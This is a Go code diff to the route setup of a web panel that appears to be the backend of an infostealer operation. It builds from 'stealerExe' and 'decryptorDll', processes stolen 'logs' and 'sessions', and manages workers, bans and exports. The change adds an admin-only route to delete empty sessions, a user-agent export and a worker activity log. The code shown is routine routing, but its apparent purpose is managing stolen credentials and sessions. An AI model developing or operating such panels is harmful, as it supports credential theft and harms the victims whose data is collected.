@@ -50,7 +50,7 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 	}
 	logProc := services.NewLogProcessor(sqlDB, broadcaster, provider)
 	logsHandler := NewLogsHandler(logProc, provider)
-	sessionsHandler := NewSessionsHandler(sqlDB, provider)
+	sessionsHandler := NewSessionsHandler(sqlDB, broadcaster, provider)
 	searchHandler := NewSearchHandler(sqlDB, provider)
 	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, sqlDB, provider)
 	notesHandler := NewNotesHandler(sqlDB, provider)
@@ -73,6 +73,7 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 	teamHandler := NewTeamHandler(sqlDB, provider)
 	auditHandler := NewAuditHandler(sqlDB, provider)
 	banAPIHandler := NewBanHandler(sqlDB, provider)
+	workerActivityHandler := NewWorkerActivityHandler(sqlDB, provider)
 	r.Group(func(r chi.Router) {
 		r.Post("/api/auth/login", authHandler.Login)
 		r.Post("/api/auth/register", usersHandler.Register)
@@ -124,6 +125,7 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 		r.Get("/api/sessions", sessionsHandler.List)
 		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
 		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
+		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/empty", sessionsHandler.DeleteEmpty)
 		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
 		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)
 		r.Patch("/api/sessions/{id}/viewed", sessionsHandler.MarkViewed)
@@ -162,6 +164,7 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 
 		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
 		r.Post("/api/export/bulk", exportHandler.ExportBulk)
+		r.Get("/api/export/useragents", exportHandler.ExportUserAgents)
 
 		r.Get("/api/settings", settingsHandler.Get)
 		r.Put("/api/settings", settingsHandler.Update)
@@ -246,6 +249,9 @@ func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *w
 		r.With(middleware.RequireRole("admin")).Get("/api/team", teamHandler.List)
 		r.With(middleware.RequireRole("admin")).Put("/api/team/{id}/role", teamHandler.ChangeRole)
 		r.With(middleware.RequireRole("admin")).Delete("/api/team/{id}", teamHandler.Remove)
+
+		// Worker activity log (admin only)
+		r.With(middleware.RequireRole("admin")).Get("/api/team/activity", workerActivityHandler.List)
 
 		// Audit log (admin only)
 		r.With(middleware.RequireRole("admin")).Get("/api/audit", auditHandler.List)
